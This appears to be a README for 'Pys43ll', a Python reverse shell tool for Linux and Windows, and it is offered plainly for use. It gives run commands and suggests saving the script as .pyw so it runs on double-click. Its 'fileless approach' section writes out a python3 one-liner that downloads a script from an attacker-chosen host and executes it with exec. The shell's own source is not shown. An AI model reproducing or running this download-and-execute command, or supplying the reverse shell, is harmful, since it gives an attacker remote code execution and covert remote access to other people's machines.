# Pys43ll

A Python Reverse Shell that can be used on Linux and Windows.

# Remember

The use of Windows requires Python3 installed. Remember to add the IP Address and Port of your choosing. On Windows the file can be saved with .pyw to allow a double-click execution.

# How to Use

Windows: .\pys43ll.py

Linux: python3 pys43ll.py

# Fileless Approach

python3 -c ("""from urllib.request import urlopen;url = 'http://< YOUR IP >/< DIRECTORY >/filename.py';outtie = urlopen(url).read();getit = outtie.decode('utf-8');exec(outtie)""")
